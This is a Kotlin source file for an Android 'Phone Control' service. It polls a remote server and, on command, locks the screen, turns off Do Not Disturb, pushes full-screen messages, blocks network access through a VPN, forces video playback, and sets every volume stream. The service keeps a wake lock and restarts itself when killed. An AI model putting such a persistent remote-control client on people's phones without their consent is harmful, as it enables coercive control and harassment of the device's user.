package com.phonecontrol

import android.app.*
import android.content.Context
import android.content.Intent
import android.media.AudioManager
import android.os.IBinder
import android.util.Log
import androidx.core.app.NotificationCompat
import kotlinx.coroutines.*
import okhttp3.OkHttpClient
import okhttp3.Request
import org.json.JSONObject
import java.util.concurrent.TimeUnit

class ControlService : Service() {

    private val scope = CoroutineScope(Dispatchers.IO + SupervisorJob())
    private var pollingJob: Job? = null
    private var deviceActive = false
    private var wakeLock: android.os.PowerManager.WakeLock? = null
    private var consecutiveErrors = 0

    companion object {
        const val CHANNEL_ID = "PhoneControlChannel"
        const val NOTIF_ID = 1
        const val SERVER_URL = BuildConfig.SERVER_URL
        const val DEVICE_SECRET = BuildConfig.DEVICE_SECRET
        const val TAG = "ControlService"
        private const val MAX_CONSECUTIVE_ERRORS = 10
    }

    private val httpClient: OkHttpClient by lazy {
        OkHttpClient.Builder()
            .connectTimeout(15, TimeUnit.SECONDS)
            .readTimeout(15, TimeUnit.SECONDS)
            .retryOnConnectionFailure(true)
            .build()
    }

    override fun onCreate() {
        super.onCreate()
        createNotificationChannel()
        startForeground(NOTIF_ID, buildNotification("Слежу за командами..."))

        val pm = getSystemService(Context.POWER_SERVICE) as android.os.PowerManager
        wakeLock = pm.newWakeLock(
            android.os.PowerManager.PARTIAL_WAKE_LOCK,
            "PhoneControl::PollingWakeLock"
        ).also { it.acquire() }

        startPolling()
        BootReceiver.scheduleWatchdog(this)
        KeepAliveWorker.schedule(this)
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int = START_STICKY
    override fun onBind(intent: Intent?): IBinder? = null

    override fun onDestroy() {
        Log.w(TAG, "Service destroyed")
        scope.cancel()
        try { wakeLock?.release() } catch (e: Exception) { }
        super.onDestroy()

        val restartIntent = Intent(applicationContext, ControlService::class.java)
        val pendingIntent = PendingIntent.getService(
            applicationContext, 1, restartIntent,
            PendingIntent.FLAG_ONE_SHOT or PendingIntent.FLAG_IMMUTABLE
        )
        (getSystemService(Context.ALARM_SERVICE) as AlarmManager).setExactAndAllowWhileIdle(
            AlarmManager.ELAPSED_REALTIME_WAKEUP,
            android.os.SystemClock.elapsedRealtime() + 3_000L,
            pendingIntent
        )
    }

    private fun startPolling() {
        pollingJob?.cancel()
        pollingJob = scope.launch {
            while (isActive) {
                try {
                    val result = poll()
                    consecutiveErrors = 0

                    val active = result.optBoolean("active", false)
                    if (active != deviceActive) {
                        deviceActive = active
                        updateNotification(if (deviceActive) "Режим управления активен" else "Слежу за командами...")
                    }

                    val cmd = result.optJSONObject("command")
                    if (cmd != null) handleCommand(cmd)

                } catch (e: Exception) {
                    consecutiveErrors++
                    Log.e(TAG, "Poll error #$consecutiveErrors: ${e.message}")
                    if (consecutiveErrors >= MAX_CONSECUTIVE_ERRORS) {
                        consecutiveErrors = 0
                        delay(60_000L)
                        continue
                    }
                }
                delay(if (deviceActive) 10_000L else 30_000L)
            }
        }
    }

    private fun poll(): JSONObject {
        val request = Request.Builder()
            .url("$SERVER_URL/poll")
            .addHeader("X-Device-Secret", DEVICE_SECRET)
            .build()
        httpClient.newCall(request).execute().use { response ->
            val body = response.body?.string() ?: "{}"
            if (!response.isSuccessful) throw Exception("HTTP ${response.code}")
            return JSONObject(body)
        }
    }

    private fun handleCommand(cmd: JSONObject) {
        scope.launch(SupervisorJob()) {
            try {
                val lock = cmd.optBoolean("lock", false)
                val duration = cmd.optInt("duration", 0)
                when (cmd.optString("cmd")) {
                    "shutdown"      -> shutdown()
                    "dnd_off"       -> disableDnD()
                    "show_message"  -> showOverlayMessage(cmd.optString("text", "Сообщение"))
                    "ban"           -> startVpnBlock()
                    "unban"         -> stopVpnBlock()
                    "video"         -> VideoActivity.startBuiltin(this@ControlService, cmd.optInt("num", 1), lock, duration)
                    "play_raw"      -> VideoActivity.startFromUrl(this@ControlService, cmd.optString("url"), lock, duration)
                    "delete_video"  -> deleteVideoCache(cmd.optString("url"))
                    "sound"         -> setVolume(cmd.optInt("level", 5))
                    "unban_video"   -> VideoActivity.unlock()
                }
            } catch (e: Exception) {
                Log.e(TAG, "Command failed: ${e.message}")
            }
        }
    }

    private fun shutdown() {
        val dpm = getSystemService(Context.DEVICE_POLICY_SERVICE) as android.app.admin.DevicePolicyManager
        val cn = android.content.ComponentName(this, AdminReceiver::class.java)
        if (dpm.isAdminActive(cn)) dpm.lockNow()
    }

    private fun disableDnD() {
        val nm = getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
        if (nm.isNotificationPolicyAccessGranted)
            nm.setInterruptionFilter(NotificationManager.INTERRUPTION_FILTER_ALL)
    }

    private fun startVpnBlock() {
        startService(Intent(this, BlockVpnService::class.java))
        VpnMonitor.start(this)
    }

    private fun stopVpnBlock() {
        VpnMonitor.stop(this)
        startService(Intent(this, BlockVpnService::class.java).apply { action = "STOP" })
    }

    private fun setVolume(level: Int) {
        val am = getSystemService(Context.AUDIO_SERVICE) as AudioManager
        listOf(
            AudioManager.STREAM_MUSIC,
            AudioManager.STREAM_RING,
            AudioManager.STREAM_NOTIFICATION,
            AudioManager.STREAM_ALARM
        ).forEach { stream ->
            val max = am.getStreamMaxVolume(stream)
            val target = (level / 10f * max).toInt().coerceIn(0, max)
            try { am.setStreamVolume(stream, target, 0) } catch (e: Exception) { }
        }
    }

    private fun deleteVideoCache(url: String) {
        if (url.isEmpty()) return
        val file = VideoActivity.getCacheFile(this, url)
        if (file.exists()) file.delete()
    }

    private fun showOverlayMessage(text: String) {
        try {
            val intent = Intent(this, OverlayActivity::class.java).apply {
                flags = Intent.FLAG_ACTIVITY_NEW_TASK or
                        Intent.FLAG_ACTIVITY_CLEAR_TOP or
                        Intent.FLAG_ACTIVITY_SINGLE_TOP
                putExtra("message", text)
            }
            try { startActivity(intent) } catch (e: Exception) { }

            val pendingIntent = PendingIntent.getActivity(
                this, System.currentTimeMillis().toInt(), intent,
                PendingIntent.FLAG_UPDATE_CURRENT or PendingIntent.FLAG_IMMUTABLE
            )
            val notification = NotificationCompat.Builder(this, "msg_channel")
                .setSmallIcon(android.R.drawable.ic_dialog_info)
                .setContentTitle("Сообщение")
                .setContentText(text)
                .setPriority(NotificationCompat.PRIORITY_MAX)
                .setCategory(NotificationCompat.CATEGORY_CALL)
                .setFullScreenIntent(pendingIntent, true)
                .setAutoCancel(true)
                .setVibrate(longArrayOf(0, 500, 200, 500))
                .build()

            getSystemService(NotificationManager::class.java).notify(999, notification)
        } catch (e: Exception) {
            Log.e(TAG, "showOverlayMessage failed: ${e.message}")
        }
    }

    private fun createNotificationChannel() {
        val nm = getSystemService(NotificationManager::class.java)
        nm.createNotificationChannel(
            NotificationChannel(CHANNEL_ID, "Phone Control", NotificationManager.IMPORTANCE_LOW)
        )
        nm.createNotificationChannel(
            NotificationChannel("msg_channel", "Сообщения", NotificationManager.IMPORTANCE_HIGH).apply {
                enableLights(true)
                enableVibration(true)
                setBypassDnd(true)
                lockscreenVisibility = Notification.VISIBILITY_PUBLIC
            }
        )
    }

    private fun buildNotification(text: String): Notification =
        NotificationCompat.Builder(this, CHANNEL_ID)
            .setContentTitle("Phone Control")
            .setContentText(text)
            .setSmallIcon(android.R.drawable.ic_menu_manage)
            .setPriority(NotificationCompat.PRIORITY_LOW)
            .build()

    private fun updateNotification(text: String) {
        getSystemService(NotificationManager::class.java).notify(NOTIF_ID, buildNotification(text))
    }
}
